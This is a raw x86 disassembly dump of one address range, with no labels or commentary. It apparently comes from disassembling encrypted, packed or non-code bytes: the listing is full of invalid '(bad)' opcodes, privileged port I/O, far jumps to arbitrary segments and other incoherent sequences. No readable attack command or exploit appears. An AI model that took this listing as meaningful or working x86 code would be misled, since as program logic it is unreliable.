  413249:	mov    ecx,0x732bbc4b
  41324e:	push   esi
  41324f:	push   0xccc12e4e
  413254:	sbb    BYTE PTR [ebp+0x2d],ah
  413257:	push   ebx
  413258:	xlat   BYTE PTR ds:[ebx]
  413259:	sbb    ebx,0xffffff94
  41325c:	ds mov bl,0xb7
  41325f:	sahf   
  413260:	cmp    ecx,esi
  413262:	fwait
  413263:	int3   
  413264:	aaa    
  413265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413266:	xchg   ebp,eax
  413267:	sbb    eax,ebx
  413269:	xor    eax,0x2592124
  41326e:	mov    eax,ds:0x801fed36
  413273:	stos   DWORD PTR es:[edi],eax
  413274:	aaa    
  413275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413276:	mov    esp,0x8c44d72
  41327b:	out    0x5c,eax
  41327d:	fdiv   QWORD PTR [eax]
  41327f:	mov    ds:0x2cc56b40,eax
  413284:	or     eax,0x159314e9
  413289:	xchg   esi,eax
  41328a:	lods   al,BYTE PTR ds:[esi]
  41328b:	mov    eax,0x641ade89
  413290:	arpl   WORD PTR ds:[ecx-0x2d376ee7],bx
  413297:	sbb    edx,DWORD PTR [esi-0x6cb42e6c]
  41329d:	jb     0x413237
  41329f:	icebp  
  4132a0:	push   ebx
  4132a1:	xor    BYTE PTR [eax-0x14],ch
  4132a4:	mov    bh,0x3d
  4132a6:	repz cmp ecx,DWORD PTR [ecx-0x7b]
  4132aa:	sbb    dl,al
  4132ac:	out    0xc3,al
  4132ae:	mov    ebx,0x6034ca1f
  4132b3:	jmp    0x50a6:0x2e733201
  4132ba:	jmp    0x64f8:0x57d0ec59
  4132c1:	and    al,0xc2
  4132c3:	aad    0xf5
  4132c5:	cmp    al,0x9a
  4132c7:	fnstcw WORD PTR [ebx-0x76]
  4132ca:	xchg   dh,bl
  4132cc:	sub    BYTE PTR [edx],bl
  4132ce:	lock daa 
  4132d0:	test   esp,0x1f485ce1
  4132d6:	dec    ecx
  4132d7:	shl    edx,1
  4132d9:	pop    ds
  4132da:	inc    esp
  4132db:	inc    esi
  4132dc:	dec    ebx
  4132dd:	fistp  DWORD PTR [ebx]
  4132df:	fbstp  TBYTE PTR [esi]
  4132e1:	in     eax,0xb7
  4132e3:	das    
  4132e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132e5:	sub    ebp,DWORD PTR [edi+edi*8]
  4132e8:	dec    esi
  4132e9:	add    DWORD PTR [ecx*8+0x136c26e],ebx
  4132f0:	jecxz  0x4132eb
  4132f2:	mov    ecx,DWORD PTR [esi]
  4132f4:	loopne 0x4132c1
  4132f6:	stc    
  4132f7:	push   0xd9bfb5ba
  4132fc:	fst    DWORD PTR [edi-0x17c5d40c]
  413302:	xor    BYTE PTR [di+0x49],ah
  413306:	leave  
  413307:	adc    bl,BYTE PTR [eax+0x1a0833d1]
  41330d:	fisub  WORD PTR [eax-0x29f2744b]
  413313:	mov    dh,0xe3
  413315:	je     0x413385
  413317:	dec    esi
  413318:	jo     0x413341
  41331a:	(bad)  
  41331b:	stc    
  41331c:	xchg   BYTE PTR [edx],al
  41331e:	lods   eax,DWORD PTR ds:[esi]
  41331f:	cmp    bl,dh
  413321:	adc    bh,BYTE PTR [ecx-0x68]
  413324:	int    0x2f
  413326:	xchg   ecx,eax
  413327:	xor    DWORD PTR [edi-0x52366d6e],edi
  41332d:	adc    al,BYTE PTR [ebp+0x56f98b8f]
  413333:	test   eax,0x7967fd67
  413338:	scas   eax,DWORD PTR es:[edi]
  413339:	addr16 inc eax
  41333b:	cmc    
  41333c:	sbb    edi,eax
  41333e:	and    al,0xab
  413340:	push   ebp
  413341:	scas   al,BYTE PTR es:[edi]
  413342:	jnp    0x4133a8
  413344:	jo     0x413309
  413346:	dec    edi
  413347:	pop    esi
  413348:	jmp    0x7676:0x3b3635e1
  41334f:	mov    al,ds:0x6ae66ff9
  413354:	pushf  
  413355:	(bad)  
  413357:	xchg   edx,eax
  413358:	inc    ebx
  413359:	sahf   
  41335a:	sbb    eax,0x7e4534d2
  41335f:	std    
  413360:	mov    esp,0x3a7afd12
  413365:	enter  0x8bbe,0x85
  413369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336a:	inc    ecx
  41336b:	and    WORD PTR [esi-0x51],sp
  41336f:	test   DWORD PTR [ebx+0x1f8f8eed],ebx
  413375:	in     al,0xb8
  413377:	add    BYTE PTR [esi+esi*2],cl
  41337a:	imul   ebp,DWORD PTR [ebx],0x268bce41
  413380:	adc    BYTE PTR [eax+0x6c],dl
  413383:	and    eax,ebx
  413385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413386:	mov    WORD PTR ds:0x5a5ffaa7,fs
  41338c:	nop
  41338d:	pop    ss
  41338e:	pop    ebp
  41338f:	nop
  413390:	js     0x4133a2
  413392:	(bad)  
  413393:	mov    dl,0xfc
  413395:	fwait
  413396:	test   BYTE PTR [edx-0x71894e35],dl
  41339c:	jne    0x41340d
  41339e:	into   
  41339f:	inc    ecx
  4133a0:	iret   
  4133a1:	out    0xed,al
  4133a3:	sbb    BYTE PTR [edx+0x3b],dh
  4133a6:	test   eax,0x6fdb0bd4
  4133ab:	pop    edx
  4133ac:	loopne 0x413391
  4133ae:	in     eax,0x2c
  4133b0:	sub    ebp,eax
  4133b2:	nop
  4133b3:	fldl2e 
  4133b5:	ds aaa 
  4133b7:	and    bl,dl
  4133b9:	push   eax
  4133ba:	xor    ebx,DWORD PTR [ebp+0x3b75b7cd]
  4133c0:	push   0xffffffa7
  4133c2:	sub    bh,BYTE PTR [esi-0x1]
  4133c5:	jbe    0x413361
  4133c7:	(bad)  
  4133c9:	imul   eax,DWORD PTR [eax+0x4a],0xb862175c
  4133d0:	jl     0x41340c
  4133d2:	fisttp DWORD PTR [ebp+0x52]
  4133d5:	mov    WORD PTR [edx+0x3e],gs
  4133d8:	mov    eax,0x1e8d1756
  4133dd:	icebp  
  4133de:	cdq    
  4133df:	fldcw  WORD PTR [esi-0x5ad56a98]
  4133e5:	arpl   WORD PTR [eax],si
  4133e7:	inc    ebp
  4133e8:	dec    ebp
  4133e9:	push   eax
  4133ea:	cmp    al,0x78
  4133ec:	and    al,0x10
  4133ee:	sub    BYTE PTR [edi-0x5885c0c5],ch
  4133f4:	xor    eax,0xe4b4d8cf
  4133f9:	mov    ds:0xc77747df,al
  4133fe:	test   BYTE PTR [esi],0x35
  413401:	add    bl,bh
  413403:	pushf  
  413404:	loopne 0x4133c6
  413406:	add    edi,DWORD PTR es:[edx+0x67553c40]
  41340d:	pop    esi
  41340e:	sub    eax,0x2996e9f
  413413:	dec    eax
  413414:	sti    
  413415:	pop    es
  413416:	(bad)  
  413417:	pop    esi
  413418:	aad    0xe4
  41341a:	push   esi
  41341b:	xchg   ebx,eax
  41341c:	dec    edx
  41341d:	in     eax,dx
  41341e:	or     bl,dl
  413420:	sub    DWORD PTR ds:0x91970cab,ebx
  413426:	xor    bx,cx
  413429:	pop    ss
  41342a:	ret    0x2ba1
  41342d:	add    BYTE PTR [ebp+0x7a],ch
  413430:	sar    DWORD PTR [edi+0x38],0x77
  413434:	inc    ebx
  413435:	call   0xcb18:0xeb61658f
  41343c:	enter  0x6d5c,0x8b
  413440:	hlt    
  413441:	mov    ebx,0xdf5f6a6b
  413446:	(bad)  
  413447:	repnz mov edi,0xacaa2e6c
  41344d:	clc    
  41344e:	retf   0x6a39
  413451:	fisubr WORD PTR [ecx]
  413453:	mov    ebp,0x1edf3910
  413458:	js     0x41347f
  41345a:	sar    BYTE PTR [ebp-0x45],cl
  41345d:	push   ebx
  41345e:	jmp    esi
  413460:	nop
  413461:	aaa    
  413462:	out    0x69,al
  413464:	test   ebx,esi
  413466:	sub    cl,al
  413468:	add    ebx,esp
  41346a:	push   ebp
  41346b:	mov    cl,0xa0
  41346d:	sbb    al,BYTE PTR [esi-0x5ba72359]
  413473:	sub    DWORD PTR [esi-0x17045be1],esp
  413479:	sub    DWORD PTR [ebp-0x47],ebx
  41347c:	sahf   
  41347d:	and    esp,edx
  41347f:	jno    0x413439
  413481:	mov    DWORD PTR [eax+0x5856cfd3],eax
  413487:	sub    al,BYTE PTR [edx+0x1570dd2d]
  41348d:	or     eax,0x35715d8d
  413492:	cmp    eax,0xf97d477c
  413497:	xchg   BYTE PTR [ecx+ebx*8-0x798bd306],bh
  41349e:	inc    ebp
  41349f:	xor    esi,DWORD PTR [edi]
  4134a1:	sub    eax,edx
  4134a3:	and    eax,DWORD PTR [ecx+0x51eda0cb]
  4134a9:	pusha  
  4134aa:	and    ch,cl
  4134ac:	daa    
  4134ad:	xchg   edx,eax
  4134ae:	fimul  DWORD PTR [eax]
  4134b0:	test   BYTE PTR [ebp-0x45412330],al
  4134b6:	rcr    cl,1
  4134b8:	std    
  4134b9:	add    al,0xe7
  4134bb:	cwde   
  4134bc:	mov    ebp,0x58471c77
  4134c1:	arpl   WORD PTR [esi+ebx*1+0x616d760],dx
  4134c8:	cmp    ebx,DWORD PTR [ecx+ebx*8]
  4134cb:	inc    ebp
  4134cc:	repnz mov BYTE PTR [esi],0xc1
  4134d0:	push   ebx
  4134d1:	mov    bl,0x82
  4134d3:	push   ss
  4134d4:	mov    DWORD PTR [edx-0x7eb936f],edx
  4134da:	(bad)  
  4134db:	fst    QWORD PTR [ebx+ebx*1+0x3]
  4134df:	sar    DWORD PTR ds:0xef7c2904,1
  4134e5:	(bad)  [ecx+0x50]
  4134e8:	test   dl,0x95
  4134eb:	enter  0x63ab,0x98
  4134ef:	xor    cl,BYTE PTR [esi+edx*2]
  4134f2:	out    0x2,al
  4134f4:	lock jbe 0x4134f2
  4134f7:	fs push esi
  4134f9:	push   eax
  4134fa:	clc    
  4134fb:	xchg   ebp,esi
  4134fd:	das    
  4134fe:	push   eax
  4134ff:	mov    dh,0xb3
  413501:	mov    edx,0x69ed8314
  413506:	sub    cl,BYTE PTR gs:[ecx-0x1a]
  41350a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41350b:	in     ax,dx
  41350d:	out    0x2,al
  41350f:	test   eax,0x1d85a4de
  413514:	mov    bl,0x7d
  413516:	in     al,dx
  413517:	or     al,0x2d
  413519:	cmp    edx,edi
  41351b:	rcl    BYTE PTR [ebx+0x7e8e6807],0xd
  413522:	imul   eax,DWORD PTR [ecx+0x2e],0xfe1afdd3
  413529:	sub    al,bl
  41352b:	jecxz  0x4134d0
  41352d:	sub    DWORD PTR [eax],esi
  41352f:	adc    DWORD PTR [ebp+0x66],eax
  413532:	clc    
  413533:	pop    es
  413534:	push   0x46
  413536:	push   ebx
  413537:	or     al,0xef
  413539:	fwait
  41353a:	and    edx,ebp
  41353c:	xor    DWORD PTR [ebx],edi
  41353e:	xchg   ecx,eax
  41353f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413540:	or     BYTE PTR ds:0x36a9dadc,dh
  413546:	ret    
  413547:	(bad)  
  413548:	xor    BYTE PTR [ecx-0xf67ae08],ch
  41354e:	aas    
  41354f:	xchg   esi,eax
  413550:	add    eax,0xd40a73d
  413555:	push   cs
  413556:	jbe    0x4135a0
  413558:	jnp    0x413565
  41355a:	mov    dh,0x22
  41355c:	outs   dx,BYTE PTR ds:[esi]
  41355d:	std    
  41355e:	into   
  41355f:	or     al,0x52
  413561:	in     eax,dx
  413562:	pushf  
  413563:	mov    cl,0x54
  413565:	xor    ebp,esp
  413567:	hlt    
  413568:	pop    esp
  413569:	out    0xf7,eax
  41356b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41356c:	push   eax
  41356d:	mov    ebp,0xf2cfd60e
  413572:	push   0xffffffc3
  413574:	mov    bh,dh
  413576:	ss push edx
  413578:	and    DWORD PTR [eax+ecx*8-0x6c],esi
  41357c:	mov    dl,0xfd
  41357e:	mov    al,ds:0x37f6c017
  413583:	sahf   
  413584:	dec    esi
  413585:	push   cs
  413586:	(bad)  
  413587:	out    0xf3,eax
  413589:	out    0x52,al
  41358b:	push   0x98380b9f
  413590:	jl     0x413611
  413592:	fbstp  TBYTE PTR [ebx+edx*1-0x22]
  413596:	test   al,0xca
  413598:	cli    
  413599:	push   ecx
  41359a:	dec    esi
  41359b:	or     DWORD PTR [edx-0x2651377e],eax
  4135a1:	mov    al,0xad
  4135a3:	out    0x3c,eax
  4135a5:	pop    ebx
  4135a6:	add    edi,esi
  4135a8:	or     BYTE PTR [ecx-0x62483e28],dh
  4135ae:	sahf   
  4135af:	dec    esp
  4135b0:	inc    esp
  4135b1:	mov    bh,BYTE PTR [edx-0x3c]
  4135b4:	sub    DWORD PTR [edx-0x4f],0x3ae672fc
  4135bb:	(bad)  
  4135bc:	aam    0xfa
  4135be:	test   DWORD PTR [esi],0x25ab7048
  4135c4:	cmp    dl,dl
  4135c6:	std    
  4135c7:	xchg   ebp,eax
  4135c8:	mov    edi,0xf4421df
  4135cd:	mov    DWORD PTR [ecx+0x2c127e84],ebp
  4135d3:	popa   
  4135d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135d5:	jmp    0x3b90:0xfc8050b8
  4135dc:	or     DWORD PTR [esi-0x16],0x1f39edbb
  4135e3:	test   bh,cl
  4135e5:	cmp    eax,0xce0e1ac6
  4135ea:	in     eax,dx
  4135eb:	inc    ecx
  4135ec:	and    ecx,DWORD PTR [ebx+ebp*1-0x2]
  4135f0:	shl    al,cl
  4135f2:	mov    cl,ah
  4135f4:	jge    0x41363a
  4135f6:	test   bh,ch
  4135f8:	sub    ecx,ebp
  4135fa:	cmc    
  4135fb:	add    bl,cl
  4135fd:	sub    ah,BYTE PTR [edx-0x45]
  413600:	mov    dl,0xf5
  413602:	loop   0x413651
  413604:	cmp    dh,bl
  413606:	pop    esp
  413607:	xchg   DWORD PTR [ebx-0x4b5f1f16],ebp
  41360d:	pushf  
  41360e:	jnp    0x4135c2
  413610:	loop   0x4135b2
  413612:	adc    al,0x81
  413614:	mov    ds:0x515bda55,al
  413619:	or     eax,0xdd243673
  41361e:	add    eax,0x9f2378e4
  413623:	nop
  413624:	dec    ecx
  413625:	jmp    0x413607
  413627:	icebp  
  413628:	rcl    DWORD PTR [esi+0x60fd4ed5],0x71
  41362f:	sbb    ebx,ebx
  413631:	sbb    esp,DWORD PTR [ebp-0x6b5c3972]
  413637:	cmp    edx,DWORD PTR [edi]
  413639:	lods   eax,DWORD PTR ds:[esi]
  41363a:	in     eax,0x9b
  41363c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41363d:	imul   eax,esp,0xffffffa0
  413640:	push   eax
  413641:	push   ss
  413642:	lea    esi,[ebp-0x45507fc]
  413648:	call   0x58d445ed
  41364d:	cdq    
  41364e:	sub    DWORD PTR [esi+0x3e6a9bea],0x6729da6c
  413658:	cli    
  413659:	pop    ebx
  41365a:	mov    DWORD PTR [ecx],esp
  41365c:	repz add DWORD PTR [edx+0x382008b5],edi
  413663:	std    
  413664:	mov    al,0x35
  413666:	in     eax,dx
  413667:	mov    ds:0xb61ca99c,al
  41366c:	or     al,BYTE PTR [eax+0x6c]
  41366f:	daa    
  413670:	cmp    eax,0xa42a8d2e
  413675:	enter  0x32ae,0x32
  413679:	add    dl,ah
  41367b:	pop    ebx
  41367c:	add    dl,dh
  41367e:	iret   
  41367f:	pop    es
  413680:	pop    edx
  413681:	mov    ah,0xe6
  413683:	dec    ecx
  413684:	jbe    0x413691
  413686:	mov    ds,esp
  413688:	(bad)  
  41368a:	xlat   BYTE PTR ds:[ebx]
  41368b:	or     DWORD PTR [eax+0x7106d4a3],0x41fdae4b
  413695:	(bad)  
  413696:	js     0x413649
  413698:	inc    esi
  413699:	out    0x19,al
  41369b:	sbb    eax,0xb4a9bfcb
  4136a0:	in     al,dx
  4136a1:	mov    BYTE PTR [edx-0x67],bh
  4136a4:	cmp    ah,BYTE PTR [eax-0x3204a69]
  4136aa:	add    BYTE PTR [ebx],cl
  4136ac:	xchg   BYTE PTR [ebp-0x101ed8d2],dh
  4136b2:	lods   eax,DWORD PTR ds:[esi]
  4136b3:	mov    ds,WORD PTR [ecx]
  4136b5:	mov    WORD PTR [eax+0x51793744],?
  4136bb:	mov    al,BYTE PTR [ebp+eiz*2+0x72]
  4136bf:	pop    ebx
  4136c0:	pop    es
  4136c1:	out    dx,al
  4136c2:	ds leave 
  4136c4:	fadd   DWORD PTR [ebp+0x39]
  4136c7:	popa   
  4136c8:	mov    ecx,0x8faf9a4b
  4136cd:	repnz ror cl,cl
  4136d0:	dec    ebx
  4136d1:	imul   edx,DWORD PTR [ebp-0x5cf9bdb],0xffffffe3
  4136d8:	pushf  
  4136d9:	mov    WORD PTR [esi+0x3842e3c6],?
  4136df:	xchg   esi,eax
  4136e0:	or     ebx,esp
  4136e2:	push   ecx
  4136e3:	dec    esp
  4136e4:	int    0xdb
  4136e6:	push   0xffffff88
  4136e8:	pop    ds
  4136e9:	out    dx,eax
  4136ea:	jb     0x41375a
  4136ec:	test   al,0xc5
  4136ee:	adc    ebx,esi
  4136f0:	and    dl,BYTE PTR [ecx+0x726e01b0]
  4136f6:	inc    cl
  4136f8:	pop    edi
  4136f9:	sbb    al,0x35
  4136fb:	stos   DWORD PTR es:[edi],eax
  4136fc:	cdq    
  4136fd:	aam    0xa1
  4136ff:	div    DWORD PTR [eax+edi*2-0x4e29fa3b]
  413706:	js     0x41370e
  413708:	iret   
  413709:	popa   
  41370a:	into   
  41370b:	into   
  41370c:	xor    DWORD PTR [ebp+0x10],0xa
  413710:	test   DWORD PTR [edx+0x250363a3],ebp
  413716:	sub    DWORD PTR [edi+esi*1-0x7894e94e],0x4e23beba
  413721:	ret    0x7d6f
  413724:	(bad)  
  413725:	xchg   BYTE PTR [esi+0x36b1f092],ah
  41372b:	jne    0x4137ac
  41372d:	or     DWORD PTR [ecx-0xe],0xffffffd8
  413731:	jle    0x413767
  413733:	push   edi
  413734:	iret   
  413735:	loope  0x41372f
  413737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413738:	mov    bl,0x69
  41373a:	fld    DWORD PTR [esi-0x59]
  41373d:	(bad)  
  41373e:	mov    eax,ds:0xb19c8dde
  413743:	sahf   
  413744:	dec    ebx
  413745:	add    ch,al
  413747:	push   ebx
  413748:	jb     0x41374f
  41374a:	loope  0x41378d
  41374c:	fs aad 0x3b
  41374f:	jge    0x4136fd
  413751:	push   ss
  413752:	test   DWORD PTR [edx+0x5ee46e98],0xe62973b3
  41375c:	xor    esp,DWORD PTR ds:0x7bc3501e
  413762:	mov    edi,0xd046e1e3
  413767:	inc    ebx
  413768:	push   edx
  413769:	mov    edx,0x333c0e3b
  41376e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41376f:	mov    ds:0x6abb4700,eax
  413774:	shr    DWORD PTR [edi],1
  413776:	pop    esp
  413777:	push   es
  413778:	mov    ch,0x5d
  41377a:	cmp    BYTE PTR [esi],0x5f
  41377d:	test   eax,0x5d63fcf1
  413782:	sahf   
  413783:	or     al,0x61
  413785:	inc    eax
  413786:	lock inc esi
  413788:	(bad)  
  413789:	cmc    
  41378a:	addr16 mov ebx,0x1a127ea1
  413790:	into   
  413791:	(bad)  
  413792:	stos   DWORD PTR es:[edi],eax
  413793:	test   BYTE PTR [edx-0x2110d703],ch
  413799:	mov    ds:0x94d2d06f,al
  41379e:	inc    ebx
  41379f:	(bad)  
  4137a0:	pop    ecx
  4137a1:	dec    edi
  4137a2:	dec    edi
  4137a3:	inc    ebx
  4137a4:	iret   
  4137a5:	mov    ecx,0x17ce1214
  4137aa:	sub    bh,al
  4137ac:	xchg   esi,eax
  4137ad:	in     al,0x62
  4137af:	int    0xaa
  4137b1:	out    0x2e,al
  4137b3:	xor    ch,dh
  4137b5:	fisttp WORD PTR [edi+eax*8+0x83f1ac0]
  4137bc:	loope  0x41375d
  4137be:	dec    edx
  4137bf:	mov    dh,0x12
  4137c1:	ret    
  4137c2:	clc    
  4137c3:	push   es
  4137c4:	jnp    0x4137af
  4137c6:	jge    0x413769
  4137c8:	sbb    DWORD PTR [edi+0x70109aff],edx
  4137ce:	ins    BYTE PTR es:[edi],dx
  4137cf:	jmp    0x4137f6
  4137d1:	lods   al,BYTE PTR ds:[esi]
  4137d2:	mov    dl,0x3
  4137d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d5:	scas   al,BYTE PTR es:[edi]
  4137d6:	or     BYTE PTR [eax+0x231a16a4],cl
  4137dc:	pop    ecx
  4137dd:	cmc    
  4137de:	mov    eax,ds:0x7c1a8842
  4137e3:	adc    eax,0x932db46a
  4137e8:	test   DWORD PTR [esi+0x82bc74c],edx
  4137ee:	outs   dx,DWORD PTR ds:[esi]
  4137ef:	adc    esi,DWORD PTR [esi+0x2a]
  4137f2:	fisub  DWORD PTR [esi]
  4137f4:	(bad)  
  4137f5:	mov    dh,0xbc
  4137f7:	lock test al,0x87
  4137fa:	adc    bx,WORD PTR [edi-0x13fb5b0b]
  413801:	test   al,0x1d
  413803:	or     eax,0x4c126928
  413808:	and    eax,0xa0057fbf
  41380d:	imul   ebp,ebp,0x53eb56f9
  413813:	xchg   ebp,eax
  413814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413815:	jge    0x4137a1
  413817:	jnp    0x41385e
  413819:	inc    esi
  41381a:	pop    ds
  41381b:	call   0x490:0x81cc4fae
  413822:	jbe    0x41381d
  413824:	push   0xffffffd7
  413826:	cwde   
  413827:	lock loope 0x4137e5
  41382a:	sub    bl,al
  41382c:	or     DWORD PTR [ebx+0x60c867ef],esp
  413832:	fwait
  413833:	jbe    0x41389e
  413835:	rcl    BYTE PTR [edi+edx*2],1
  413838:	pop    ss
  413839:	fisub  DWORD PTR [esi]
  41383b:	mov    ah,0x1f
  41383d:	out    0xe0,al
  41383f:	mov    al,0x9e
  413841:	add    eax,0xc9335621
  413846:	pushf  
  413847:	or     eax,0xca870edd
  41384c:	xor    cl,dl
  41384e:	push   es
  41384f:	push   ss
  413850:	xchg   ebx,eax
  413851:	adc    edi,DWORD PTR [esi-0x65427892]
  413857:	(bad)  
  413858:	mov    esp,0x41e137c
  41385d:	push   cs
  41385e:	jmp    0xfe9a:0x87a94af1
  413865:	mov    ebx,0x1a82fe5
  41386a:	fld    TBYTE PTR [eax]
  41386c:	icebp  
  41386d:	js     0x413893
  41386f:	stc    
  413870:	pushf  
  413871:	pop    esp
  413872:	mov    cl,0x56
  413874:	inc    eax
  413875:	sub    cl,BYTE PTR [eax+0x1]
  413878:	call   0xf98a:0x755d8e5d
  41387f:	jb     0x4138f1
  413881:	pop    ebp
  413882:	test   eax,0x71080902
  413887:	sbb    ebx,DWORD PTR [edi-0x2591a843]
  41388d:	mov    DWORD PTR [ebp-0x38],esp
  413890:	dec    edi
  413891:	fiadd  DWORD PTR [edi]
  413893:	dec    ecx
  413894:	(bad)  
  413896:	pop    eax
  413897:	sub    esi,DWORD PTR [edi-0x72]
  41389a:	or     DWORD PTR [ecx-0x73],esp
  41389d:	(bad)  
  41389e:	jmp    0x413904
  4138a0:	cmp    eax,0x701de1d0
  4138a5:	add    BYTE PTR [edx],bl
  4138a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138a8:	mov    bh,0x89
  4138aa:	fs addr16 push edi
  4138ad:	in     al,0x8a
  4138af:	out    0xe0,al
  4138b1:	or     BYTE PTR [esi+0x45465e7a],ch
  4138b7:	je     0x4138a2
  4138b9:	mov    eax,0x3cd744dd
  4138be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138bf:	retf   0x28ab
  4138c2:	jecxz  0x413851
  4138c4:	and    BYTE PTR [edi+0x38a79655],ch
  4138ca:	mov    ebp,esi
  4138cc:	shl    BYTE PTR [edx],0x2e
  4138cf:	cmc    
  4138d0:	loopne 0x413907
  4138d2:	jmp    FWORD PTR ds:0x10f943d6
  4138d8:	fstp   DWORD PTR [ebx]
  4138da:	scas   eax,DWORD PTR es:[edi]
  4138db:	or     al,0xa1
  4138dd:	sbb    ch,BYTE PTR [edx+0x45]
  4138e0:	and    BYTE PTR [ecx-0x7c],bh
  4138e3:	xchg   ecx,eax
  4138e4:	(bad)  
  4138e5:	cmp    eax,0xceff918a
  4138ea:	loope  0x41387e
  4138ec:	mov    dh,BYTE PTR [ecx+0x5a]
  4138ef:	push   es
  4138f0:	mov    ah,0xbe
  4138f2:	dec    edi
  4138f3:	std    
  4138f4:	and    DWORD PTR [ecx-0x359f996e],eax
  4138fa:	jp     0x4138d7
  4138fc:	push   edi
  4138fd:	jno    0x413882
  4138ff:	sub    BYTE PTR [edx],0x2e
  413902:	add    al,BYTE PTR [edi+0x1db20397]
  413908:	fisubr DWORD PTR [ebp+0x2a873cb6]
  41390e:	dec    esp
  41390f:	xor    al,0xf6
  413911:	cmp    eax,0xdbcfe387
  413916:	repz fisttp DWORD PTR [edi]
  413919:	ffree  st(2)
  41391b:	imul   eax,DWORD PTR fs:[ecx+0x7f],0xb4f2d25c
  413923:	mov    BYTE PTR [edx+0x32],bl
  413926:	push   eax
  413927:	xor    DWORD PTR [edi],ebp
  413929:	(bad)  
  41392a:	bound  ecx,QWORD PTR [edx-0x50e4797]
  413930:	sahf   
  413931:	mov    ebp,0xe057c0b9
  413936:	aaa    
  413937:	xor    eax,0xe01d71c
  41393c:	cmp    eax,ebx
  41393e:	call   0xa5991786
  413943:	fstp   DWORD PTR [edi]
  413945:	or     ebp,DWORD PTR [ebp-0x78]
  413948:	fwait
  413949:	scas   eax,DWORD PTR es:[edi]
  41394a:	test   al,0xb9
  41394c:	jb     0x4139c6
  41394e:	das    
  41394f:	sti    
  413950:	or     eax,0xca6a60f
  413955:	xchg   ebp,eax
  413956:	or     esp,DWORD PTR [eax-0x538e7ecd]
  41395c:	aam    0x4a
  41395e:	push   edi
  41395f:	adc    dh,BYTE PTR [ecx-0x78]
  413962:	retf   
  413963:	add    DWORD PTR [eax],edx
  413965:	ds inc edi
  413967:	popf   
  413968:	mov    ebp,0x8ec94d77
  41396d:	pop    edx
  41396e:	mov    BYTE PTR [edx-0x28],ah
  413971:	shr    BYTE PTR [eax-0x7f],cl
  413974:	outs   dx,BYTE PTR ds:[esi]
  413975:	or     al,ch
  413977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413978:	cmp    BYTE PTR [ebx+0x7677463d],bl
  41397e:	pop    eax
  41397f:	rol    DWORD PTR [edi-0x21],0xba
  413983:	aaa    
  413984:	mov    ds:0x4ca4b98f,eax
  413989:	retf   
  41398a:	jno    0x413980
  41398c:	stc    
  41398d:	or     edx,edi
  41398f:	int    0xc2
  413991:	popa   
  413992:	out    dx,al
  413993:	into   
  413994:	cmp    bl,BYTE PTR [esi+eiz*1]
  413997:	adc    eax,0xb2294c4e
  41399c:	xor    eax,ebp
  41399e:	fisub  DWORD PTR [ebx]
  4139a0:	inc    ebx
  4139a1:	push   DWORD PTR [ecx+ebx*4+0x6e]
  4139a5:	dec    edx
  4139a6:	adc    eax,0xe649089
  4139ab:	mov    dl,BYTE PTR [edi]
  4139ad:	push   ss
  4139ae:	lahf   
  4139af:	xchg   DWORD PTR [esi-0x48],esi
  4139b2:	xchg   ecx,eax
  4139b3:	fiadd  DWORD PTR [eax+0x28]
  4139b6:	int    0x63
  4139b8:	idiv   BYTE PTR [ecx-0x214197b5]
  4139be:	sbb    DWORD PTR [ebx+ebp*1],edi
  4139c1:	mov    dl,al
  4139c3:	xchg   BYTE PTR [ebx+0x4d083a3c],al
  4139c9:	xchg   esi,eax
  4139ca:	xlat   BYTE PTR ds:[ebx]
  4139cb:	inc    ebx
  4139cc:	loop   0x4139b6
  4139ce:	mov    ds:0x5c0c169e,eax
  4139d3:	(bad)  
  4139d5:	into   
  4139d6:	sahf   
  4139d7:	inc    ebp
  4139d8:	fcmovnbe st,st(6)
  4139da:	xchg   esp,eax
  4139db:	xor    eax,0xe0799f9b
  4139e0:	(bad)  
  4139e1:	in     al,0x15
  4139e3:	loop   0x413a42
  4139e5:	leave  
  4139e6:	stc    
  4139e7:	pop    eax
  4139e8:	xor    DWORD PTR [ebx+0x6ee4594a],esi
  4139ee:	add    al,BYTE PTR [edx+0x9]
  4139f1:	and    edi,DWORD PTR [ebx]
  4139f3:	pop    ebx
  4139f4:	add    dl,BYTE PTR [esi+0x53]
  4139f7:	lods   al,BYTE PTR ds:[esi]
  4139f8:	xchg   ebp,eax
  4139f9:	jmp    0x4139de
  4139fb:	xor    eax,0x7552d3d4
  413a00:	repz fsub QWORD PTR [esi+0x50]
  413a04:	adc    eax,0xb5a5184
  413a09:	add    BYTE PTR [edi],ah
  413a0b:	push   esi
  413a0c:	popa   
  413a0d:	adc    edi,DWORD PTR [eax-0x4e]
  413a10:	sbb    eax,0x3bdfb755
  413a15:	mov    al,ds:0x8d0d14c3
  413a1a:	xchg   DWORD PTR [eax-0x7245fdf4],eax
  413a20:	jns    0x413a73
  413a22:	icebp  
  413a23:	mov    ds:0x1a5f38b6,eax
  413a28:	rcl    DWORD PTR [eax],1
  413a2a:	mov    edx,0x9ef9d27d
  413a2f:	inc    esp
  413a30:	ins    DWORD PTR es:[edi],dx
  413a31:	mov    DWORD PTR [esi-0x7],edx
  413a34:	mov    bl,0x91
  413a36:	lds    ebp,FWORD PTR [ecx-0x3d]
  413a39:	mov    ecx,0xd7a47532
  413a3e:	fucomi st,st(6)
  413a40:	(bad)  
  413a41:	out    dx,eax
  413a42:	shl    BYTE PTR [ecx-0x506eb37d],cl
  413a48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a49:	lds    ebx,FWORD PTR ds:0x75ba35a7
  413a4f:	pop    eax
  413a50:	nop
